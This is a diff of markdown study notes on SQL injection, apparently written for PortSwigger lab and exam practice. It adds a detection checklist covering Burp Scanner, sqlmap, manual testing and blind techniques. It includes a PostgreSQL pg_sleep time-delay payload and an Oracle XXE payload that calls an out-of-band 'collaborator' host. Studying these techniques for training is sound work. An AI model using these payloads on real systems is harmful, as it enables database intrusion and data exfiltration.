@@ -36,13 +36,36 @@
   - [16. Blind SQL injection with out-of-band data exfiltration](./lab/16.%20Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration.md)
   - [17. SQL injection with filter bypass via XML encoding](./lab/17.%20SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding.md)
 
+## Preparation for exam
+
+[cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+detect:
+
+- burp scanner
+- sqlmap
+- manual
+
+  - determine version
+  - blind or not
+  - find number of columns return by query
+  - check columns data type
+
+  - if blind
+    - time delay check
+    - time delay data retrieval
+    - conditional response: compare reponse
+    - conditional error: compare status code
+    - oob interaction
+    - oob data exfiltration
+
 ## Version detection
 
 server synchronous (time delay):
 
 - mssql:
 - mysql:
-- postgresql
+- postgresql:
 
   ```sql
   '||pg_sleep(10)--
@@ -53,10 +76,6 @@ server synchronous (time delay):
   ```
 
 - oracle:
-
-  ```sql
-  
-  ```
 
 server asynchronous (out of band):
 
@@ -74,23 +93,6 @@ server asynchronous (out of band):
   ```sql
   'UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//collaborator/">+%25remote%3b]>'),'/l')+FROM+dual--;
   ```
-
-## Preparation for exam
-
-[cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
-
-- determine version
-- blind or not
-- find number of columns return by query
-- check columns data type
-
-- if blind
-  - time delay check
-  - time delay data retrieval
-  - conditional response: compare reponse
-  - conditional error: compare status code
-  - oob interaction
-  - oob data exfiltration
 
 ## sqlmap
 
